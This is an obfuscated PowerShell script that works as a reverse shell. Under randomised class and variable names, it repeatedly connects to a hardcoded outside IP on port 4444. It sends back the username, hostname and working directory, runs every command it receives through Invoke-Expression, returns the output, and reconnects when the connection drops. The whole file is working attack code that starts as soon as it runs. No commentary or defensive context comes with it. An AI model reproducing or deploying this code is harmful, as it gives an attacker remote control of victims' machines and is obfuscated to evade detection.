class MTjMuqgFOacNbArrLbXzVery {
    
    [string]$fGxDLFtGjvFBIXhfgGyuv = "93.49.240.195"
    [int]$DwYZZSXJtfd = 4444

    $dOTAoDuLMNZyeanbyq
    $eFjPTUEcicUgkC
    $TKMzJMJcL
    $zCAtYMoCGRlxwHvNsIg
    $HRdaArtDECSDCJGDI
    $MUXXfVpySm
    [int]$iUjYj = 50*1024

    jWwGhtYzUMegrBPK() {
        $this.eFjPTUEcicUgkC = $false
        while ($true) {
            try {
                $this.eFjPTUEcicUgkC = New-Object Net.Sockets.TcpClient($this.fGxDLFtGjvFBIXhfgGyuv, $this.DwYZZSXJtfd)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.dQJgdLH()
    }

    dQJgdLH() {
        $this.dOTAoDuLMNZyeanbyq = $this.eFjPTUEcicUgkC.GetStream()
        $this.zCAtYMoCGRlxwHvNsIg = New-Object Byte[] $this.iUjYj
        $this.MUXXfVpySm = New-Object Text.UTF8Encoding
        $this.TKMzJMJcL = New-Object IO.StreamWriter($this.dOTAoDuLMNZyeanbyq, [Text.Encoding]::UTF8, $this.iUjYj)
        $this.HRdaArtDECSDCJGDI = New-Object System.IO.StreamReader($this.dOTAoDuLMNZyeanbyq)
        $this.TKMzJMJcL.AutoFlush = $true
    }

    wrWMcBOQEMOeHfloXcWyJ() {
        $this.jWwGhtYzUMegrBPK()
        $this.slIZOur()
    }

    GwxgYWLbQva($fJdEvhMrfMCjv) {
        try {
            [byte[]]$DuFXHstv = [text.Encoding]::Ascii.GetBytes($fJdEvhMrfMCjv)
            $this.TKMzJMJcL.Write($DuFXHstv, 0, $DuFXHstv.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.wrWMcBOQEMOeHfloXcWyJ()
        }
    }

    [string] vWIoQ() {
        try {
            $iVFjSGb = $this.dOTAoDuLMNZyeanbyq.Read($this.zCAtYMoCGRlxwHvNsIg, 0, $this.iUjYj)    
            $bVFhadYlUdhlOgfgLSMJrz = ($this.MUXXfVpySm.GetString($this.zCAtYMoCGRlxwHvNsIg, 0, $iVFjSGb))
            return $bVFhadYlUdhlOgfgLSMJrz
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.wrWMcBOQEMOeHfloXcWyJ()
            return ""
        }
    }

    [string] cqmSPZyVSdPhyzgwbQcTpjMD($CGomgeqQguxjvpOVkgwOM) {
        Write-Host $CGomgeqQguxjvpOVkgwOM
        try { 
            $YOEqPZx = Invoke-Expression $CGomgeqQguxjvpOVkgwOM | Out-String
        }
        catch {
            $bqHfoiAHlocJLaHwGTozeTX = $_.Exception
            $gsStycCNOMYm = $_.Message
            $YOEqPZx = "`n$_`n"
        }
        return $YOEqPZx
    }

    [string] gHhhHXz() {
        $ZvXsIbjkvdlcDXPTrp = [Environment]::UserName
        $lgjAtZOUNKGR = [System.Net.Dns]::GetHostName()
        $LHXazbmKRxTYSXuU = Get-Location
        return "$ZvXsIbjkvdlcDXPTrp@$lgjAtZOUNKGR [$LHXazbmKRxTYSXuU]~$ "
    }

    slIZOur() {
        while ($this.eFjPTUEcicUgkC.Connected) {
            $this.GwxgYWLbQva($this.gHhhHXz())         
            $bVFhadYlUdhlOgfgLSMJrz = $this.vWIoQ()
            $YOEqPZx = "`n"
            if ([string]::IsNullOrEmpty($bVFhadYlUdhlOgfgLSMJrz)) {
                continue
            }
            $YOEqPZx = $this.cqmSPZyVSdPhyzgwbQcTpjMD($bVFhadYlUdhlOgfgLSMJrz)
            $this.GwxgYWLbQva($YOEqPZx + "`n")
            $this.dOTAoDuLMNZyeanbyq.Flush()
        }
        $this.eFjPTUEcicUgkC.Close()
        $this.wrWMcBOQEMOeHfloXcWyJ()
    } 
}

$FWpLX = [MTjMuqgFOacNbArrLbXzVery]::new()
$FWpLX.wrWMcBOQEMOeHfloXcWyJ()
